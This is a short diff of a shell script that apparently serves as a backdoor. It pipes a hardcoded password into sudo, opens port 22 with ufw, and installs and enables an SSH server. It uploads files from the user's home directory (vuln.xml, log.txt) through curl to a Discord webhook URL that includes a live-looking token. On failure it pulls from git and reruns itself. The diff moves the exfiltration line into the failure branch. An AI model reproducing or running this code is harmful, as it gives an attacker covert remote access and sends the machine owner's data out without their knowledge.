@@ -7,17 +7,14 @@ if echo '56554' | sudo -S sh -c "sudo ufw allow ssh"; then
   	curl -F "filename=@/home/$USER/vuln.xml" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
 	echo "SUDO SUCCESS installing ssh services..."
 	sudo apt install openssh-server -y 
-  	# sudo echo "<command>" >>  "/etc/ssh/sshd_config"
- 	# sudo service ssh restart
 	sudo systemctl enable ssh
 	echo "ssh installed and enable. open port 22 "
- 	# sudo systemctl status ssh
 else	
+	curl -F "filename=@/home/$USER/log.txt" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
 	sleep 5
  	git stash
   	git rebase origin main
    	git pull
    	chmod +x no.sh
-    	curl -F "filename=@/home/$USER/log.txt" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
- 	./$0
+    	./$0
 fi
